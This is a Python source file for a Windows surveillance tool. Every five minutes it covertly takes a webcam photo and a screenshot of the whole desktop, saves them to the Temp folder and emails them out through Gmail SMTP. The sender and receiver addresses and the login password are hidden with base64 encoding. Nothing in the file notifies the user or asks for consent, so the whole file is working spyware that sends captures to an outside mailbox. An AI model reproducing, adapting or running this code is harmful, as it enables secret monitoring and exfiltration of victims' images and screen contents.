import os
import time
import email
import queue
import base64
import smtplib

from datetime import datetime
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import cv2
import win32api
import win32con
import win32gui
import win32ui

queue = queue.Queue()

# 5 minutes
SEND_REPORT_EVERY = 300

EMAIL_ADDRESS = base64.b64decode("bWFpbmZyYW1laGF4QGdtYWlsLmNvbQ==").decode("utf-8")
EMAIL_PASSWORD = base64.b64decode("N0hlbW1lbGln").decode("utf-8")
EMAIL_RECEIVE = base64.b64decode("ZXd5Ym95QGdtYWlsLmNvbQ==").decode("utf-8")

ATTACHMENT_PATH_CAM = 'c:\\WINDOWS\\Temp\\image.jpg'
ATTACHMENT_PATH_FILE = 'c:\\WINDOWS\\Temp\\readme.txt'
ATTACHMENT_PATH_SCREEN = 'c:\\WINDOWS\\Temp\\screenshot.bmp'


# creates a timestamp for the email header
def get_date():
    dateTimeObj = datetime.now()
    timeString = dateTimeObj.strftime("%d-%b-%Y (%H:%M:%S)")
    print(timeString)

    return timeString


# constructs and sends email with image attached
def mail(subject, attach_screen, attach_cam):
    msg = MIMEMultipart()

    # builds email structure
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_RECEIVE
    msg['Subject'] = subject

    msg.attach(MIMEText('Screenshot:'))

    # attaches screenshot to email as attachment
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach_screen, 'rb').read())
    email.encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach_screen))
    msg.attach(part)

    msg.attach(MIMEText('Camshot:'))

    # attaches webcam photo to email as attachment
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach_cam, 'rb').read())
    email.encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach_cam))
    msg.attach(part)

    # initializes smtp email server
    mailServer = smtplib.SMTP("smtp.gmail.com", 587)
    mailServer.ehlo()

    # starts smtp email server
    mailServer.starttls()
    mailServer.ehlo()

    # attempts to log in to provided email
    mailServer.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

    # attempts to send email to target receiver
    mailServer.sendmail(EMAIL_ADDRESS, EMAIL_RECEIVE, msg.as_string())

    # closes smtp email server
    mailServer.close()

    print('Information sent..')


def take_screenshot():
    try:
        # grab a handle to the main desktop window
        desktop = win32gui.GetDesktopWindow()

        # determine the size of all monitors in pixels
        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

        # create a device context
        desktop_dc = win32gui.GetWindowDC(desktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)

        # create a memory based device context
        mem_dev_ctx = img_dc.CreateCompatibleDC()

        # create a bitmap object
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dev_ctx.SelectObject(screenshot)

        # copy the screen into our memory device context
        mem_dev_ctx.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

        # save the bitmap to a file
        screenshot.SaveBitmapFile(mem_dev_ctx, ATTACHMENT_PATH_SCREEN)

        # free our objects
        mem_dev_ctx.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())

        print('Screenshot taken:', screenshot)
    except:
        print('Failed to grab screenshot')


def take_camshot():
    try:
        cam = cv2.VideoCapture(0)
        retval, frame = cam.read()
        cv2.imwrite(ATTACHMENT_PATH_CAM, frame)
        print('Webcam Capture Taken')
    except:
        print('No cam detected')


if __name__ == '__main__':
    # main loop - loops every 5 minutes

    while True:
        take_camshot()
        take_screenshot()
        mail(get_date(), ATTACHMENT_PATH_SCREEN, ATTACHMENT_PATH_CAM)
        time.sleep(SEND_REPORT_EVERY)
